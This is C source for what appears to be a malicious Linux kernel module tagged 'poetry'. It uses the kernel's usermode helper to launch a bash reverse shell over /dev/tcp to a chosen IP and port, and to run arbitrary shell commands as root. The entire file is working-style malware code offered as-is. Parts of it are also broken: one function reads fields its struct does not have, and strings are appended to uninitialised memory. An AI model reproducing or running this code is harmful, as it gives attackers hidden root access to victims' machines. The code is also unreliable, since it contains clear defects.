#define HOME "HOME=/root"
#define TERM "TERM=xterm-256color"
#define SHELL "/bin/bash"
#define EXEC_P1 "bash -i >& /dev/tcp/"
#define EXEC_P2 "0>&1"

struct shell_params {
	struct work_struct work;
	char* target_ip;
	char* target_port;
};

struct command_params {
    struct work_struct work;
    char* command;
};

void execute_reverse_shell(struct work_struct *work){
    int err;
    struct shell_params *params = (struct shell_params*)work;
    char *envp[] = {HOME, TERM, params->target_ip, params->target_port, NULL};
    char *exec = kmalloc(sizeof(char)*256, GFP_KERNEL);
    char *argv[] = {SHELL, "-c", exec, NULL};
    strcat(exec, EXEC_P1);
    strcat(exec, params->target_ip);
	strcat(exec, "/");
    strcat(exec, params->target_port);
	strcat(exec, " ");
    strcat(exec, EXEC_P2);
    printk(KERN_INFO "poetry: Starting reverse shell %s\n", exec);

    err = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    if(err<0){
        printk(KERN_INFO "poetry: Error executing usermodehelper.\n");
    }
    kfree(exec);
    kfree(params->target_ip);
    kfree(params->target_port);
    kfree(params);

}

int start_reverse_shell(char* ip, const char* port){
    int err;
    struct shell_params *params = kmalloc(sizeof(struct shell_params), GFP_KERNEL);
    if(!params){
        printk(KERN_INFO "poetry: Error allocating memory\n");
        return 1;
    }
    params->target_ip = kstrdup(ip, GFP_KERNEL);
    params->target_port = kstrdup(port, GFP_KERNEL);
    INIT_WORK(&params->work, &execute_reverse_shell);

    err = schedule_work(&params->work);
    if(err<0){
        printk(KERN_INFO "poetry: Error scheduling work of starting shell\n");
    }
    return err;
}

void execute_command(struct work_struct *work)
{
    int err;
    struct command_params *params = (struct command_params*)work;
    char *envp[] = {HOME, TERM, params->target_ip, params->target_port, NULL};
    char *exec = kmalloc(sizeof(char)*256, GFP_KERNEL);
    char *argv[] = {SHELL, "-c", exec, NULL};
    strcat(exec, params->command);
    printk(KERN_INFO "poetry: executing command %s\n", exec);

    err = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    if(err<0){
        printk(KERN_INFO "poetry: Error executing usermodehelper.\n");
    }
    kfree(exec);
    kfree(params->command);
    kfree(params);
}

int start_command(char* command)
{
    int err;
    struct command_params *params = kmalloc(sizeof(struct command_params), GFP_KERNEL);
    if(!params){
        printk(KERN_INFO "poetry: Error allocating memory\n");
        return 1;
    }
    params->command = kstrdup(command, GFP_KERNEL);
    INIT_WORK(&params->work, &execute_command);

    err = schedule_work(&params->work);
    if(err<0){
        printk(KERN_INFO "poetry: Error scheduling work of executing command\n");
    }
    return err;
}
